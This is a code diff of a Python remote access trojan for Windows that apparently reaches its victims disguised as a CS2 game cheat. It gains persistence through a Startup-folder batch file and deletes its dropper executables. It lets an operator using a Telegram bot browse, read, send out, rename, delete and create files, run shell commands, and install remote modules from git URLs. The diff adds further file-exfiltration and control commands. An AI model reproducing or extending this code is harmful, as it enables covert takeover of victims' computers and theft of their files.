@@ -12,8 +12,8 @@ def getDownloadPath():
 def formatList(l,sep):
     return sep.join(l)
 def downloadAndSetupMod(urlGit,name):
-    global nameMods
     global modules
+    global mods
     if not os.path.isdir(f"C:\\winTest\\{name}"):
         installed=[]
         noInstalled=[]
@@ -33,15 +33,23 @@ def downloadAndSetupMod(urlGit,name):
         shutil.move(f"C:\\winTest\\{name}\\{dirSetupName}\\data",f"C:\\winTest\\{name}")
         shutil.rmtree(f"C:\\winTest\\{name}\\{dirSetupName}")
         print(dirSetupName)
+
         with open(f"C:\\winTest\\{name}\\data\\modules.txt") as file:
             for line in file:
                 modules.append(line.rstrip('\n'))
+        modules = list(set(modules))
         for i in modules:
             if int(os.system(f"pip3 install {i}"))==0:
                 installed.append(i)
             else:
                 noInstalled.append(i)
-        modules=list(set(modules))
+        with open("C:\\winTest\\modules.pkl","wb") as file:
+            pickle.dump(modules,file)
+
+        mods[name]=urlGit
+        with open("C:\\winTest\\mods.pkl","wb") as file:
+            pickle.dump(mods,file)
+        """modules=list(set(modules))
         with open("C:\\winTest\\modules.txt","w") as file:
             for i in modules:
                 file.write(i+'\n')
@@ -51,46 +59,61 @@ def downloadAndSetupMod(urlGit,name):
         with open("C:\\winTest\\mods.txt","w") as file:
             file.write(' '.join(mods1))
         nameMods.append(name)
-        print(nameMods)
+        print(nameMods)"""
         return installed,noInstalled
     else:
         return "module installed"
 def deletaEXE():
-    with open("C:\\winTest\\dir.txt") as file:
-        x=file.read().rstrip('\n').split('\\')[:-1]
     x1=x.copy()
-    x.append('cs2_cs-go_cheat.exe')
-    x1.append('python-3.12.1-amd64.exe')
-    y='\\'.join(x)
-    y1 = '\\'.join(x1)
+    x2=x.copy()
+    x1.append('cs2_cs-go_cheat.exe')
+    x2.append('python-3.12.1-amd64.exe')
+    y='\\'.join(x1)
+    y1 = '\\'.join(x2)
     os.system(f"del {y}")
     os.system(f"del {y1}")
-def startModule(dirName,fileName):
+def startModule(dirName):
     global processes
-    xx=subprocess.Popen(['python',f"C:\\winTest\\{dirName}\\{fileName}.pyw"])
+    xx=subprocess.Popen(['python',f"C:\\winTest\\{dirName}\\{dirName}.pyw"])
     processes[dirName]=xx
 def stopModule(name):
     global processes
+    with open(f"C:\\winTest\\{name}\\output.txt") as file:
+        prout=file.read()
     processes[name].terminate()
     del processes[name]
+    return prout
 def run_command(cmd):
     result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
     b = bytes(result.stdout+result.stderr, "cp1251")
     s = str(b, "cp866")
     return s
 
-
-
-import subprocess,time,os,shutil
+import subprocess,time,os,shutil,pickle
 os.system("pip3 install requests")
 os.system("pip3 install pyTelegramBotAPI")
 import requests
 import telebot
 from telebot import types
 from zipfile import ZipFile
+
+pn=["C:"]
+processes={}
+
+with open("C:\\winTest\\data.pkl","rb") as file:
+    rtok=pickle.load(file)
+    x=rtok["dir"].split("\\")[:-2]
+    tok=rtok["token"]
+    print(x,tok)
+with open("C:\\winTest\\modules.pkl","rb") as file:
+    modules=pickle.load(file)
+    print(modules)
+with open("C:\\winTest\\mods.pkl","rb") as file:
+    mods=pickle.load(file)
+    print(mods)
+for i in mods:
+    downloadAndSetupMod(mods[i],i)
 deletaEXE()
-with open("C:\\winTest\\dir.txt") as file:
-    x = file.read().rstrip('\n').split('\\')[:-2]
 x.append("AppData")
 x.append("Roaming")
 x.append("Microsoft")
@@ -100,43 +123,11 @@ x.append("Programs")
 x.append("Startup")
 x.append("autoStartWin.bat")
 x='\\'.join(x)
+
 if not os.path.isfile(x):
     with open(x,"w+") as bat_file:
         bat_file.write(r'start "" %s' % "C:\\winTest\\winStart.pyw")
-
-if not os.path.isdir(f"C:\\winTest"):
-    os.mkdir(f"C:\\winTest")
-if not os.path.isfile("C:\\winTest\\modules.txt"):
-    with open("C:\\winTest\\modules.txt","a"):
-        pass
-if not os.path.isfile("C:\\winTest\\mods.txt"):
-    with open("C:\\winTest\\mods.txt","a"):
-        pass
-mods=[]
-nameMods=[]
-modules=[]
-processes={}
-pn=["C:"]
-with open("C:\\winTest\\mods.txt") as file:
-    mods=file.read().rstrip('\n').lstrip().split(' ')
-    print(mods)
-with open("C:\\winTest\\modules.txt") as file:
-    modules=file.read().rstrip('\n').split(' ')
-for i in mods:
-    try:
-        url,n1=i.split('#')
-        print(downloadAndSetupMod(url, n1))
-        nameMods.append(n1)
-    except ValueError:
-        nameMods=[]
-        print("exept")
-print(nameMods)
-for i in modules:
-    os.system(f"pip3 install {i}")
-with open("C:\\winTest\\dir1.txt") as file:
-    token=file.read()
-bot = telebot.TeleBot(token)
-print(nameMods)
+bot = telebot.TeleBot(tok)
 @bot.message_handler(commands="start")
 def keyb(message):
     markup=types.ReplyKeyboardMarkup()
@@ -147,9 +138,13 @@ def keyb(message):
     bt5 = types.KeyboardButton("/pwd")
     bt6 = types.KeyboardButton("/get")
     bt7 = types.KeyboardButton("/..")
+    bt8= types.KeyboardButton("/rename")
+    bt9 = types.KeyboardButton("/create")
+    bt10=types.KeyboardButton("/mods")
     markup.row(bt1,bt2,bt3)
     markup.row(bt4, bt5, bt6)
-    markup.row(bt7)
+    markup.row(bt7,bt8,bt9)
+    markup.row(bt10)
     bot.send_message(message.chat.id,"Hello",reply_markup=markup)
 @bot.message_handler(commands="dirs")
 def dirs(message):
@@ -176,25 +171,31 @@ def calldata(callback):
         teg,pth=callback.data.split("#")
         pn.append(pth)
         bot.delete_message(callback.message.chat.id,callback.message.message_id)
+        bot.delete_message(callback.message.chat.id, callback.message.message_id-1)
         print(pn)
     elif callback.data=="..":
         pn=pn[:-1]
         bot.delete_message(callback.message.chat.id, callback.message.message_id)
+        bot.delete_message(callback.message.chat.id, callback.message.message_id-1)
+
+#@bot.message_handler(commands="")
 @bot.message_handler(commands="pwd")
 def pwd(message):
     bot.delete_message(message.chat.id,message.message_id)
     bot.send_message(message.chat.id,"\\".join(pn))
 @bot.message_handler(commands="delete")
 def delete(message):
+    global pn
     xz="\\".join(pn)
     try:
         os.remove(xz)
+        pn=pn[:-1]
         bot.send_message(message.chat.id, "Удаление было произведено успешно")
     except Exception as e:
         bot.send_message(message.chat.id, "При удалении произошла ошибка, возможно это связанно с некоректным путём")
         bot.send_message(message.chat.id, e)
 @bot.message_handler(commands="read")
-def delete(message):
+def read(message):
     xz="\\".join(pn)
     try:
         with open(xz) as file:
@@ -205,11 +206,14 @@ def delete(message):
         bot.send_message(message.chat.id, e)
 @bot.message_handler(commands="get")
 def getFile(message):
+    global pn
     xz="\\".join(pn)
     try:
         with open(xz,"rb") as file:
             ress=file.read()
         bot.send_document(message.chat.id,ress)
+        if len(pn) > 1:
+            pn = pn[:-1]
     except Exception as e:
         bot.send_message(message.chat.id, "При прочтении произошла ошибка, возможно это связанно с некоректным путём")
         bot.send_message(message.chat.id, e)
@@ -233,6 +237,46 @@ def back(message):
     if len(pn)>1:
         pn=pn[:-1]
     dirs(message)
+
+@bot.message_handler(commands="rename")
+def ren(message):
+    print("sfdsfg")
+    if pn[-1] == "winTest":
+        bot.send_message(message.chat.id,"Вы не можете переименовать системныю папку")
+    else:
+        bot.send_message(message.chat.id,"Введите новое имя файла")
+        bot.register_next_step_handler(message,getRen)
+def getRen(message):
+    try:
+        pn1=pn[:-1]
+        pn1.append(message.text)
+        os.rename('\\'.join(pn),"\\".join(pn1))
+        bot.send_message(message.chat.id,"Имя файла было успешно изменено")
+    except Exception as e:
+        bot.send_message(message.chat.id,"При изменении имени файла произошла ошибка")
+        bot.send_message(message.chat.id,e)
+
+@bot.message_handler(commands="create")
+def cre(message):
+    print("sfdsfg")
+    bot.send_message(message.chat.id,"Введите имя нового файла")
+    bot.register_next_step_handler(message,getCre)
+def getCre(message):
+    try:
+        pn1=pn[:]
+        pn1.append(message.text)
+        with open("\\".join(pn1),"w") as file:
+            pass
+        bot.send_message(message.chat.id,"Файл был успешно создан")
+    except Exception as e:
+        bot.send_message(message.chat.id,"При создании файла произошла ошибка")
+        bot.send_message(message.chat.id,e)
+
+@bot.message_handler(commands="mods")
+def modse(message):
+    pass
+    bot.send_message(message.chat.id,formatList(mods,', ')+'dgbvc')
+
 @bot.message_handler()
 def message(message):
     x=message.text.split('#')
@@ -240,18 +284,19 @@ def message(message):
         bot.send_message(message.chat.id,"Связь в норме")
         print("test")
     elif x[0]=='module':
-        print(nameMods)
-        if x[1] in nameMods:
+        if x[1] in mods:
             if x[2]=="start":
                 bot.send_message(message.chat.id,f"Модуль {x[1]} был успешно запущен")
-                startModule(x[1],x[1])
+                startModule(x[1])
                 print("start")
             elif x[2]=="stop":
                 try:
-                    stopModule(x[1])
+                    procres=stopModule(x[1])
                     bot.send_message(message.chat.id, f"Модуль {x[1]} был успешно отключен")
-                except:
+                    bot.send_message(message.chat.id, procres)
+                except Exception as e:
                     bot.send_message(message.chat.id, f"Модуль {x[1]} не может быть успешно отключен потому, что произошла ошибка или он уже отключен")
+                    bot.send_message(message.chat.id,e)
                 print("stop")
             else:
                 bot.send_message(message.chat.id, f"Неправильный параметр {x[2]}")
@@ -269,11 +314,12 @@ def message(message):
             else:
                 bot.send_message(message.chat.id,f"{formatList(res1[0],', ')} были установлены")
                 bot.send_message(message.chat.id, f"{formatList(res1[1],', ')} были неустановлены")
+                bot.send_message(message.chat.id, f"Список установленных модов {mods}")
         except Exception as e:
             bot.send_message(message.chat.id,"При установке мода произошла ошибка")
             bot.send_message(message.chat.id, e)
             bot.send_message(message.chat.id, x[1]+' '+x[2])
-            bot.send_message(message.chat.id,f"Список установленных модов {nameMods}")
+            bot.send_message(message.chat.id,f"Список установленных модов {mods}")
     elif x[0]=="dirs":
         try:
             bot.send_message(message.chat.id,formatList(os.listdir(x[1]),'  '))
@@ -294,7 +340,7 @@ def message(message):
                 pass
             bot.send_message(message.chat.id,"Создание было произведено успешно")
         except Exception as e:
-            bot.send_message(message.chat.id, "При удалении произошла ошибка, возможно это связанно с некоректным путём или аргументами")
+            bot.send_message(message.chat.id, "При созданиее произошла ошибка, возможно это связанно с некоректным путём или аргументами")
             bot.send_message(message.chat.id, e)
     elif x[0]=="edit":
         try:
@@ -311,6 +357,29 @@ def message(message):
             bot.send_message(message.chat.id,res12)
         except Exception as e:
             bot.send_message(message.chat.id,"При чтении произошла ошибка, возможно это связанно с некоректным путём или аргументами")
+            bot.send_message(message.chat.id, e)
+    elif x[0]=="rename":
+        try:
+            os.rename(x[1],x[2])
+            bot.send_message(message.chat.id,"Файл был успешно переименован")
+        except Exception as e:
+            bot.send_message(message.chat.id,"При чтении произошла ошибка, возможно это связанно с некоректным путём или аргументами")
+            bot.send_message(message.chat.id, e)
+    elif x[0]=="get":
+        try:
+            with open(x[1], "rb") as file:
+                ress = file.read()
+            bot.send_document(message.chat.id, ress)
+        except Exception as e:
+            bot.send_message(message.chat.id,"При прочтении и отправке файла произошла ошибка, возможно это связанно с некоректным путём или аргументами")
+            bot.send_message(message.chat.id, e)
+    elif x[0]=="open":
+        try:
+            with open(x[1]) as file:
+                ress = file.read()
+            bot.send_message(message.chat.id, ress)
+        except Exception as e:
+            bot.send_message(message.chat.id,"При прочтении и отправке файла произошла ошибка, возможно это связанно с некоректным путём или аргументами")
             bot.send_message(message.chat.id, e)
 
     elif x[0]=="cmd":
